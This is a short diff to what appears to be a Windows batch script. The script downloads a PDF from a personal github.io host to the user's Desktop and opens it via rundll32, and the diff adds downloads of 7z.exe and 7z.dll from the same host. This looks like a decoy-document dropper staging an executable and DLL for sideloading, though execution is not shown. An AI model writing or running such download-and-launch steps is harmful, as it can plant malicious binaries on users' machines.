@@ -2,3 +2,5 @@
 curl https://kingdog2.github.io/test.pdf -o "C:\Users\USER\Desktop\test.pdf"
 rundll32 url.dll,FileProtocolHandler file:///C:\Users\USER\Desktop\test.pdf
 
+curl https://kingdog2.github.io/7z.exe -o "C:\Users\USER\Desktop\7z.exe"
+curl https://kingdog2.github.io/7z.dll -o "C:\Users\USER\Desktop\7z.dll"
